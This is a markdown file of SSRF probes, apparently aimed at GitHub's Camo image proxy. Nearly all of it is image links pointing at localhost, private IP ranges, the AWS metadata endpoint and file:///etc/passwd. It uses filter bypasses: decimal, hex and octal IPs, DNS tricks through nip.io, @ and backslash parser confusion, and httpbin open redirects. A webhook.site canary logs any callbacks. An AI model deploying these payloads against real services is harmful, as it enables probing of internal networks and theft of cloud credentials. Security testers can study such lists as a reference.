# SSRF Test v16 - True SSRF Testing

Focusing on actual SSRF vectors now that header injection is confirmed NOT working.

## Canary
![canary](https://webhook.site/c1965320-5632-4d3c-88c6-f4432ddd48ce/v16-canary.gif)

## 1. Direct Internal IP Testing
These should be BLOCKED by Camo if SSRF protection works:

### Localhost variations
![local1](https://127.0.0.1/test.gif)
![local2](https://localhost/test.gif)
![local3](https://127.0.0.1:80/test.gif)
![local4](https://127.0.0.1:8080/test.gif)
![local5](https://0.0.0.0/test.gif)
![local6](https://[::1]/test.gif)

### Private IP ranges
![priv1](https://10.0.0.1/test.gif)
![priv2](https://192.168.1.1/test.gif)
![priv3](https://172.16.0.1/test.gif)

### AWS Metadata
![aws1](https://169.254.169.254/latest/meta-data/test.gif)
![aws2](https://169.254.170.2/test.gif)

## 2. Localhost Bypass Attempts
These are common SSRF filter bypasses:

### Decimal IP
![dec1](https://2130706433/test.gif)

### Hex IP
![hex1](https://0x7f000001/test.gif)

### Octal IP
![oct1](https://0177.0.0.1/test.gif)
![oct2](https://017700000001/test.gif)

### Mixed notation
![mix1](https://127.0.0.1.nip.io/test.gif)
![mix2](https://127.0.0.1.xip.io/test.gif)
![mix3](https://127.1/test.gif)
![mix4](https://127.000.000.001/test.gif)

### IPv6 variations  
![ipv6_1](https://[0:0:0:0:0:0:0:1]/test.gif)
![ipv6_2](https://[::ffff:127.0.0.1]/test.gif)
![ipv6_3](https://[0000::0001]/test.gif)

## 3. DNS Rebinding Setup
### Use external services that resolve to internal IPs
![rebind1](https://localtest.me/test.gif)
![rebind2](https://127.0.0.1.nip.io/test.gif)
![rebind3](https://spoofed.burpcollaborator.net/test.gif)

## 4. Protocol Handlers (if any bypass HTTPS)
### HTTP (downgrade)
![http1](http://webhook.site/c1965320-5632-4d3c-88c6-f4432ddd48ce/http-downgrade.gif)

### File protocol (unlikely but test)
![file1](file:///etc/passwd)
![file2](file://localhost/etc/passwd)

### Gopher (unlikely)
![gopher1](gopher://c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test)

### FTP
![ftp1](ftp://c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test)

## 5. URL Parser Confusion
### @ symbol confusion
![at1](https://webhook.site@127.0.0.1/test.gif)
![at2](https://foo@evil.com@127.0.0.1/test.gif)

### Fragment tricks
![frag1](https://127.0.0.1#@webhook.site/c1965320-5632-4d3c-88c6-f4432ddd48ce/frag.gif)

### Backslash variations
![slash1](https://webhook.site/c1965320-5632-4d3c-88c6-f4432ddd48ce\@127.0.0.1/test.gif)

## 6. Open Redirect to Internal
If any external service redirects to internal IPs:
![redir1](https://httpbin.org/redirect-to?url=http://127.0.0.1/test.gif)
![redir2](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)

## 7. DNS that resolves to internal
### Our webhook with internal DNS
![dns1](https://localhost.c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test.gif)
![dns2](https://internal.c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test.gif)
![dns3](https://metadata.c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test.gif)

## 8. Cloud Metadata Service Bypasses  
![cloud1](https://[::ffff:169.254.169.254]/latest/meta-data/)
![cloud2](https://169.254.169.254.xip.io/latest/meta-data/)

Version 16 - True SSRF testing